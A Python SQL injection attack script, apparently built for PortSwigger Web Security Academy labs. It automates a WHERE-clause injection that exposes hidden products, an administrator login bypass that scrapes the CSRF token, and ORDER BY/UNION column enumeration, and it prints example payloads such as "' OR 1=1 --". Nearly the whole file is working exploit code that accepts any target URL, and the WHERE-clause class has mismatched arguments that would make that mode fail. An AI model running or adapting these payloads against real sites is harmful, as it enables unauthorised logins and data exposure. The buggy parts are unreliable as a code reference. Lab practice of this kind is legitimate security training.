import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import signal

# import argparse
# import textwrap

""" ############################################################################
Webtest python script for testing web app vulnerabilities. 

Inspired by Rana Khalil while taking her "Web Security Academy Series" Course.
https://academy.ranakhalil.com/courses/

Created while working on the portswigger web-security labs.
https://portswigger.net/web-security/all-labs
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# For Burp Suite or ZAP proxy.
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def error_usage(exp):
    # exploit_types = ['wc', 'lb', 'uc']
    if exp == "wc":
        print(
            "[-] Usage: %s <exploit_type> <url> <path_qparams> <payload> <visible> <var_to_count>"
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s wc https://website.net "/filter?category=" "\' OR 1=1 --" 12 productId='
            % sys.argv[0]
        )
        print(
            "[-] Reference: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"
        )
    elif exp == "lb":
        print(
            "[-] Usage: %s <exploit_type> <url> <sql-payload> <text-to-search>"
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s lb "https://website.net/login" "administrator\' --" "Log out"'
            % sys.argv[0]
        )
        print(
            "[-] Reference: https://portswigger.net/web-security/sql-injection/lab-login-bypass"
        )
    elif exp == "uc":
        print(
            "[-] Usage: %s <exploit_type> <payload_type> <url> <path_param>"
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s uc orderby https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        print(
            '[-] Example: python3 %s uc union https://website.net "/filter?category=Gifts"'
            % sys.argv[0]
        )
        print(
            "[-] Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns"
        )
    # sys.exit(-1)


""" run_exploit(args) ##########################################################
This will just run the selected exploit or print error_usage(exp).
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


def run_exploit(args):
    # args = sys.argv[2:]
    exploit_types = ["wc", "lb", "uc"]
    exploit_type = sys.argv[1]
    if exploit_type == "wc":
        try:
            url, path_qparams, payload, visible, var_to_count = (
                sys.argv[2],
                sys.argv[3],
                sys.argv[4],
                sys.argv[5],
                sys.argv[6],
            )
            where_clause = WhereClause(
                url, path_qparams, payload, visible, var_to_count
            )
            where_clause.exploit_sqli(url, path_qparams, payload, visible, var_to_count)
        # If it doesn't have all the parameters, we print usage.
        except IndexError:
            error_usage(exploit_type)
    elif exploit_type == "lb":
        try:
            url, payload, text = sys.argv[2], sys.argv[3], sys.argv[4]
            sess = requests.Session()
            login_bypass = LoginBypass(sess, url, payload, text)
            login_bypass.exploit_sqli(sess, url, payload, text)
        # If it doesn't have all the parameters, we print usage.
        except IndexError as error:
            error_usage(exploit_type)
    elif exploit_type == "uc":
        try:
            payload_type, url, path_param = sys.argv[2], sys.argv[3], sys.argv[4]
            union_cols = UnionCols(payload_type, url, path_param)
            union_cols.exploit_sqli(payload_type, url, path_param)
        # If it doesn't have all the parameters, we print usage.
        except IndexError as error:
            error_usage(exploit_type)
    elif exploit_type not in exploit_types:
        print(f'That "{exploit_type}" exploit type doesn\'t exist here.')
        sys.exit(-1)


""" WhereClause() ##############################################################
SQLi vulnerability in the product category filter. When a category is selected, 
the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Attack Will cause the application to display one or more unreleased products.
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


class WhereClause:
    def __init__(self, url, payload, visible, var_to_count) -> None:
        self.url = (url,)
        self.payload = (payload,)
        self.visible = (visible,)
        self.var_to_count = var_to_count

    def exploit_sqli(url, path_qparams, payload, visible, var_to_count):
        # uri = '/filter?category='
        # req = requests.get(url + uri + payload, verify=False, proxies=proxies)
        req = requests.get(url + path_qparams + payload, verify=False, proxies=proxies)
        # Check if the response code has an unreleased item that is not public.
        html = req.text
        # Check how many products are loaded in HTML by counting items.
        # Example string: productId=
        numProducts = html.count(var_to_count)
        # Use 'if numProducts == 20' if you know the amount or 'if numProducts > 12'
        # if you only know what is visible.
        vis = int(visible)
        if numProducts > vis:
            print("[+] SQL injection successful...")
            print(f"[+] There are {numProducts - vis} hidden items.")
        else:
            print("[-] SQL injection unsuccessful...")


""" LoginBypass() ##############################################################
SQLi vulnerability in the login function. This is an SQL injection attack where 
you can log in to the application as the administrator user.
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


class LoginBypass:
    def __init__(self, sess, url, payload, text) -> None:
        self.sess = (sess,)
        self.url = (url,)
        self.payload = (payload,)
        self.text = text

    def get_csrf_token(self, sess, url):
        # print(sys.argv[2], sys.argv[3], sys.argv[4])
        try:
            req = sess.get(url, verify=False, proxies=proxies)
            # Check the HTML to see where to parse the CSRF from.
            beau_soup = BeautifulSoup(req.text, "html.parser")
            # Find the first input element and get its value.
            csrf = beau_soup.find("input")["value"]
            return csrf
        except Exception as e:
            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
            message = template.format(type(e).__name__, e.args)
            if type(e).__name__ == "ProxyError":
                print("Error Type: ProxyError. Check the proxy.")
            else:
                print("CSRF Error Return Type: ", message)

    def exploit_sqli(self, sess, url, payload, text):
        # Use Session to make certain parameters persistent across the session.
        # You don't want to send a new request every time in this case.
        # For example, we will need the cookie to stay the same.
        sess = requests.Session()
        csrf = self.get_csrf_token(sess, url)
        # Data needed for the exploit.
        data = {"csrf": csrf, "username": payload, "password": "anything"}
        # Send a POST request.
        try:
            req = sess.post(url, data=data, verify=False, proxies=proxies)
            # Check if the request logged in by looking in the response text.
            # If true, it means the exploit worked as intended.
            res = req.text
            if text in res:
                print("[+] SQL injection successful. You we're logged in.")
            else:
                print("[-] SQL injection unsuccessful.")
        except Exception as e:
            print("SQLi Error Return Type: ", type(e))


""" UnionCols() ################################################################
SQLi UNION (and ORDER BY) attack, where the number of columns is determined when
the query is returned. The vulnerability is in the product category filter.
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


class UnionCols:
    def __init__(self, payload_type, url, path_param) -> None:
        self.payload_type = (payload_type,)
        self.url = (url,)
        self.path_param = path_param
        self.columns = 0

    def column_number(self, payload_type, url, path_param):
        # print("payload_type: ", payload_type)
        # print("url: ", url)
        # print("path_param: ", path_param)
        # Run exploit with ORDER BY clause.
        if payload_type == "orderby":
            print("[+] Using the ORDER BY clause.")
            print("[+] Figuring out number of columns...")
            try:
                for i in range(1, 25):
                    # Assemble payload.
                    sql_payload = "'+order+by+%s--" % i
                    print(f"{i} : {sql_payload}")
                    # sql_payload = "{}%s{}".format(payload[0], payload[1]) %i
                    # Get request with payload.
                    r = requests.get(
                        url + path_param + sql_payload, verify=False, proxies=proxies
                    )
                    # Get the text from the request.
                    res = r.text
                    # If Internal Server Error is found in the text, column is the previous index.
                    if "Internal Server Error" in res:
                        print(f"Internal Server Error happens at column {i}.")
                        # Subtract 1 from where index stopped to get number of columns.
                        self.columns = i - 1
                        print("[+] The number of columns is " + str(self.columns) + ".")
                        return self.columns
                return False
            except Exception as e:
                print("SQLi Error Return Type: ", type(e))
        # Run exploit with UNION operation.
        elif payload_type == "union":
            print("[+] Using a UNION operation.")
            print("[+] Figuring out number of columns...")
            sql_payload = "'+UNION+select+NULL--"
            text = ",+NULL"
            substr = "--"
            index = sql_payload.index(substr)
            union = False
            try:
                for i in range(1, 25):
                    # Count the number of NULL.
                    num = sql_payload.count("NULL")
                    # If current index is first NULL, run it for the first time.
                    if num == 1 and union == False:
                        print(f"{i} : {sql_payload}")
                        # Get request with first payload.
                        r = requests.get(
                            url + path_param + sql_payload,
                            verify=False,
                            proxies=proxies,
                        )
                        # Get the text from the request.
                        res = r.text
                        # Assemble Payload and add another NULL
                        sql_payload = sql_payload[:index] + text + sql_payload[index:]
                        # If UNION select is printed in HTML on first index, return column number.
                        if "UNION select" in res:
                            self.columns = i
                    # If current index passed first NULL, keep adding NULL to string.
                    elif num > 1 and union == False:
                        print(f"{i} : {sql_payload}")
                        sql_payload = sql_payload[:index] + text + sql_payload[index:]
                        r = requests.get(
                            url + path_param + sql_payload,
                            verify=False,
                            proxies=proxies,
                        )
                        res = r.text
                        if "UNION select" in res:
                            union = True
                    # If current index passed first NULL and union is true, the column has been found.
                    elif num > 1 and union == True:
                        print(f"{i} : {sql_payload}")
                        print(f"UNION select printed in HTML at column {i}.")
                        self.columns = i
                        print("[+] The number of columns is " + str(self.columns) + ".")
                        return self.columns
                return False
            except Exception as e:
                print("SQLi Error Return Type: ", type(e))

    def exploit_sqli(self, payload_type, url, path_param):
        number_of_cols = self.column_number(payload_type, url, path_param)
        if number_of_cols:
            print("[+] SQL injection successful...")
        else:
            print("[-] The SQLi was not successful...")


def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    try:
        args = sys.argv[1:]
        run_exploit(args)
    except IndexError:
        print("[-] Show usage for exploit type: python3 %s wc " % sys.argv[0])
        print("wc = Where Clause")
        print("lb = Login Bypass")
        print("uc = Union Columns")
